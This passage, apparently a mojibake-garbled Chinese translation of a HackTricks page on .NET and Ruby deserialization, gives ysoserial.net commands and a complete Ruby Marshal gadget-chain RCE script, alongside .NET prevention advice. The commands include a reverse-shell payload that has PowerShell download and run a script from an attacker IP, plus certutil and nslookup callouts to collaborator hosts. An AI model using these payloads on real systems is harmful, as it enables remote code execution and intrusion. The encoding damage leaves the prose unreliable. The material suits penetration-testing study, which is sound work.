* **`--formatter`**ï¼Œç”¨äºæŒ‡ç¤ºåºåˆ—åŒ–æ¼æ´çš„æ–¹æ³•ï¼ˆä½ éœ€è¦çŸ¥é“åç«¯ä½¿ç”¨å“ªä¸ªåº“æ¥ååºåˆ—åŒ–æœ‰æ•ˆè½½è·ï¼Œå¹¶ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•æ¥åºåˆ—åŒ–å®ƒï¼‰
* **`--output`** ç”¨äºæŒ‡ç¤ºä½ æ˜¯å¦å¸Œæœ›ä»¥**åŸå§‹**æˆ–**base64**ç¼–ç çš„å½¢å¼è·å–æ¼æ´ã€‚_æ³¨æ„**ysoserial.net**å°†ä½¿ç”¨**UTF-16LE**ï¼ˆWindowsé»˜è®¤ä½¿ç”¨çš„ç¼–ç ï¼‰å¯¹æœ‰æ•ˆè½½è·è¿›è¡Œ**ç¼–ç **ï¼Œæ‰€ä»¥å¦‚æœä½ è·å–åŸå§‹æ•°æ®å¹¶ä»…ä»Linuxæ§åˆ¶å°å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°ä¸€äº›**ç¼–ç å…¼å®¹æ€§é—®é¢˜**ï¼Œè¿™å°†é˜»æ­¢æ¼æ´æ­£å¸¸å·¥ä½œï¼ˆåœ¨HTB JSONç›’å­ä¸­ï¼Œæœ‰æ•ˆè½½è·åœ¨UTF-16LEå’ŒASCIIä¸­éƒ½æœ‰æ•ˆï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€å®ƒæ€»æ˜¯æœ‰æ•ˆï¼‰ã€‚_
* **`--plugin`** ysoserial.netæ”¯æŒæ’ä»¶æ¥åˆ¶ä½œ**ç‰¹å®šæ¡†æ¶çš„æ¼æ´**ï¼Œå¦‚ViewState

#### æ›´å¤šysoserial.netå‚æ•°

* `--minify` å°†æä¾›ä¸€ä¸ª**æ›´å°çš„æœ‰æ•ˆè½½è·**ï¼ˆå¦‚æœå¯èƒ½ï¼‰
* `--raf -f Json.Net -c "anything"` è¿™å°†æŒ‡ç¤ºæ‰€æœ‰å¯ä»¥ä¸æä¾›çš„æ ¼å¼åŒ–å™¨ä¸€èµ·ä½¿ç”¨çš„å°å·¥å…·ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸º`Json.Net`ï¼‰
* `--sf xml` ä½ å¯ä»¥**æŒ‡ç¤ºä¸€ä¸ªå°å·¥å…·**ï¼ˆ`-g`ï¼‰ï¼Œysoserial.netå°†æœç´¢åŒ…å«"xml"çš„æ ¼å¼åŒ–å™¨ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰

**ysoserialç¤ºä¾‹**æ¥åˆ›å»ºæ¼æ´ï¼š
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** è¿˜æœ‰ä¸€ä¸ª**éå¸¸æœ‰è¶£çš„å‚æ•°**ï¼Œæœ‰åŠ©äºæ›´å¥½åœ°ç†è§£æ¯ä¸ªæ¼æ´çš„å·¥ä½œåŸç†ï¼š`--test`\
å¦‚æœä½ æŒ‡å®šäº†è¿™ä¸ªå‚æ•°ï¼Œ**ysoserial.net** å°†**å°è¯•åœ¨æœ¬åœ°æ‰§è¡Œ**æ¼æ´ï¼Œå› æ­¤ä½ å¯ä»¥æµ‹è¯•ä½ çš„æœ‰æ•ˆè½½è·æ˜¯å¦èƒ½æ­£ç¡®å·¥ä½œã€‚\
è¿™ä¸ªå‚æ•°å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºå¦‚æœä½ å®¡æŸ¥ä»£ç ï¼Œä½ ä¼šå‘ç°åƒä¸‹é¢è¿™æ ·çš„ä»£ç å—ï¼ˆæ¥è‡ª [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)ï¼‰ï¼š
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
```markdown
è¿™æ„å‘³ç€ä¸ºäº†æµ‹è¯•æ¼æ´ï¼Œä»£ç å°†è°ƒç”¨ [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
åœ¨**ä¹‹å‰çš„ä»£ç ä¸­å®¹æ˜“å—åˆ°åˆ›å»ºçš„æ¼æ´çš„æ”»å‡»**ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ åœ¨ .Net åº”ç”¨ç¨‹åºä¸­å‘ç°äº†ç±»ä¼¼çš„æƒ…å†µï¼Œè¿™æ„å‘³ç€é‚£ä¸ªåº”ç”¨ç¨‹åºå¯èƒ½ä¹Ÿå®¹æ˜“å—åˆ°æ”»å‡»ã€‚
å› æ­¤ï¼Œ**`--test`** å‚æ•°å…è®¸æˆ‘ä»¬ç†è§£**å“ªäº›ä»£ç å—å®¹æ˜“å—åˆ°** ysoserial.net å¯ä»¥åˆ›å»ºçš„ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»ã€‚

### ViewState

çœ‹çœ‹[è¿™ç¯‡å…³äº**å¦‚ä½•å°è¯•åˆ©ç”¨ .Net çš„ \_\_ViewState å‚æ•°**](exploiting-\_\_viewstate-parameter.md)æ¥**æ‰§è¡Œä»»æ„ä»£ç **çš„æ–‡ç« ã€‚å¦‚æœä½ **å·²ç»çŸ¥é“å—å®³æœºå™¨ä½¿ç”¨çš„ç§˜å¯†**ï¼Œ[**é˜…è¯»è¿™ç¯‡æ–‡ç« äº†è§£å¦‚ä½•æ‰§è¡Œä»£ç **](exploiting-\_\_viewstate-knowing-the-secret.md)ã€‚

### **é¢„é˜²**

ä¸è¦å…è®¸æ•°æ®æµå®šä¹‰å°†è¦ååºåˆ—åŒ–åˆ°çš„å¯¹è±¡ç±»å‹ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥é€šè¿‡ä½¿ç”¨ `DataContractSerializer` æˆ– `XmlSerializer` æ¥é¢„é˜²è¿™ç§æƒ…å†µï¼Œå¦‚æœå¯èƒ½çš„è¯ã€‚

åœ¨ä½¿ç”¨ `JSON.Net` æ—¶ï¼Œç¡®ä¿ `TypeNameHandling` åªè®¾ç½®ä¸º `None`ã€‚
```
TypeNameHandling = TypeNameHandling.None
```
```markdown
å¦‚æœå¿…é¡»ä½¿ç”¨`JavaScriptSerializer`ï¼Œåˆ™ä¸è¦å°†å…¶ä¸`JavaScriptTypeResolver`ä¸€èµ·ä½¿ç”¨ã€‚

å¦‚æœå¿…é¡»ååºåˆ—åŒ–å®šä¹‰äº†è‡ªå·±ç±»å‹çš„æ•°æ®æµï¼Œåˆ™åº”é™åˆ¶å…è®¸ååºåˆ—åŒ–çš„ç±»å‹ã€‚åº”è¯¥æ„è¯†åˆ°è¿™ä»ç„¶æ˜¯æœ‰é£é™©çš„ï¼Œå› ä¸ºè®¸å¤šåŸç”Ÿ.Netç±»å‹æœ¬èº«å¯èƒ½å…·æœ‰æ½œåœ¨å±é™©ã€‚ä¾‹å¦‚ï¼š
```
```
System.IO.FileInfo
```
`FileInfo` å¯¹è±¡åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœå¼•ç”¨äº†æœåŠ¡å™¨ä¸Šå®é™…å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¯ä»¥æ›´æ”¹è¿™äº›æ–‡ä»¶çš„å±æ€§ï¼Œä¾‹å¦‚è®¾ç½®ä¸ºåªè¯»ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡æ”»å‡»ã€‚

å³ä½¿æ‚¨å·²ç»é™åˆ¶äº†å¯ä»¥ååºåˆ—åŒ–çš„ç±»å‹ï¼Œè®°ä½æŸäº›ç±»å‹çš„å±æ€§å¯èƒ½å­˜åœ¨é£é™©ã€‚ä¾‹å¦‚ï¼Œ`System.ComponentModel.DataAnnotations.ValidationException` æœ‰ä¸€ä¸ªç±»å‹ä¸º `Object` çš„å±æ€§ `Value`ã€‚å¦‚æœè¿™ä¸ªç±»å‹æ˜¯å…è®¸ååºåˆ—åŒ–çš„ç±»å‹ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥å°† `Value` å±æ€§è®¾ç½®ä¸ºä»–ä»¬é€‰æ‹©çš„ä»»ä½•å¯¹è±¡ç±»å‹ã€‚

åº”è¯¥é˜»æ­¢æ”»å‡»è€…æŒ‡å®šå°†è¦å®ä¾‹åŒ–çš„ç±»å‹ã€‚å¦‚æœè¿™æ˜¯å¯èƒ½çš„ï¼Œé‚£ä¹ˆå³ä½¿æ˜¯ `DataContractSerializer` æˆ– `XmlSerializer` ä¹Ÿå¯èƒ½è¢«é¢ è¦†ï¼Œä¾‹å¦‚ï¼š
```
// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
```
```markdown
åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒæŸäº›.Netç±»å‹å†…å¯ä»¥å‘ç”Ÿæ‰§è¡Œã€‚åˆ›å»ºå¦‚ä¸‹æ‰€ç¤ºçš„æ§ä»¶æ˜¯æ— æ•ˆçš„ã€‚
```
```
var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
//generate warnings and dispose of suspectObject
}
```
å¯¹äº`BinaryFormatter`å’Œ`JSON.Net`ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„`SerializationBinder`åˆ›å»ºæ›´å®‰å…¨çš„ç™½åå•æ§åˆ¶å½¢å¼ã€‚

å°½é‡ä¿æŒå¯¹å·²çŸ¥.Netä¸å®‰å…¨ååºåˆ—åŒ–å°å·¥å…·çš„æœ€æ–°äº†è§£ï¼Œå¹¶ç‰¹åˆ«æ³¨æ„è¿™äº›ç±»å‹æ˜¯å¦å¯ä»¥é€šè¿‡æ‚¨çš„ååºåˆ—åŒ–è¿‡ç¨‹åˆ›å»ºã€‚**ååºåˆ—åŒ–å™¨åªèƒ½å®ä¾‹åŒ–å®ƒæ‰€çŸ¥é“çš„ç±»å‹**ã€‚

å°½é‡å°†å¯èƒ½åˆ›å»ºæ½œåœ¨å°å·¥å…·çš„ä»£ç ä¸å…·æœ‰äº’è”ç½‘è¿æ¥çš„ä»»ä½•ä»£ç åˆ†å¼€ã€‚ä¾‹å¦‚ï¼Œåœ¨WPFåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„`System.Windows.Data.ObjectDataProvider`æ˜¯ä¸€ä¸ªå·²çŸ¥çš„å°å·¥å…·ï¼Œå…è®¸ä»»æ„æ–¹æ³•è°ƒç”¨ã€‚åœ¨ä¸€ä¸ªååºåˆ—åŒ–ä¸å—ä¿¡ä»»æ•°æ®çš„RESTæœåŠ¡é¡¹ç›®ä¸­å¼•ç”¨æ­¤ç¨‹åºé›†å°†æ˜¯å†’é™©çš„ã€‚

### **å‚è€ƒèµ„æ–™**

* Javaå’Œ.Net JSONååºåˆ—åŒ–**è®ºæ–‡ï¼š**[**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ï¼Œ**è®²åº§ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) å’Œå¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Rubyåœ¨**marshal**åº“ä¸­æœ‰ä¸¤ç§å®ç°åºåˆ—åŒ–çš„æ–¹æ³•ï¼šç¬¬ä¸€ç§æ–¹æ³•æ˜¯**dump**ï¼Œå®ƒå°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµ**ï¼ˆåºåˆ—åŒ–ï¼‰**ã€‚ç¬¬äºŒç§æ–¹æ³•æ˜¯**load**ï¼Œå°†å­—èŠ‚æµå†æ¬¡è½¬æ¢ä¸ºå¯¹è±¡**ï¼ˆååºåˆ—åŒ–ï¼‰**ã€‚\
Rubyä½¿ç”¨HMACå¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œç­¾åï¼Œå¹¶å°†å¯†é’¥ä¿å­˜åœ¨ä»¥ä¸‹æ–‡ä»¶ä¹‹ä¸€ï¼š

* config/environment.rb
* config/initializers/secret\_token.rb
* config/secrets.yml
* /proc/self/environ

Ruby 2.Xé€šç”¨ååºåˆ—åŒ–åˆ°RCEå°å·¥å…·é“¾ï¼ˆæ›´å¤šä¿¡æ¯åœ¨[https://www.elttam.com/blog/ruby-deserialization/](https://www.elttam.com/blog/ruby-deserialization/)ï¼‰ï¼š
```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
```markdown
å…¶ä»–åˆ©ç”¨ Ruby On Rails çš„ RCE é“¾ï¼š[https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºè‹±é›„ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ä»¬ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
```
